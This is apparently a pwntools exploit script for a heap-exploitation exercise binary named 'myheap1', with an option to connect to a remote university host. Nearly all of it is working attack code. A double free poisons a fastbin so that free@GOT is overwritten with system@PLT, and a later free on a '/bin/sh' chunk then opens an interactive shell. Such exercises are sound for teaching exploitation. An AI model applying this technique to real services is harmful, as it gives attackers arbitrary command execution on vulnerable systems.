#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template myheap1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'myheap1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4461)
    else:
        return remote('localhost', 4461)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RPATH:    b'.'

io = start()

import time

def add(k, value=cyclic(8)):
    # also frees at the start
    io.send(b'a')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)
    io.send(value)

def free(k):
    io.send(b'd')
    time.sleep(0.01)
    io.send(k)


add(b'e', flat({0: "/bin/sh"}))

add(b'a')

# double free
free(b'a')
# free(b'a  ') # can skip the next one if the next add is to a

# write got exe.got['free']-16 into fd 
# add(b'b', flat({0: exe.got['free']-16}))
add(b'a', flat({0: exe.got['free']-16}))
# make fd the start of the fastbin
add(b'c') # can directly set c to something useful
# the next malloc will return exe.got['free'] as address, write system there
add(b'd', flat({0: exe.plt['system']}))

# will call free(e) but now free is system and *c is "/bin/sh"
free(b'e')

io.interactive()

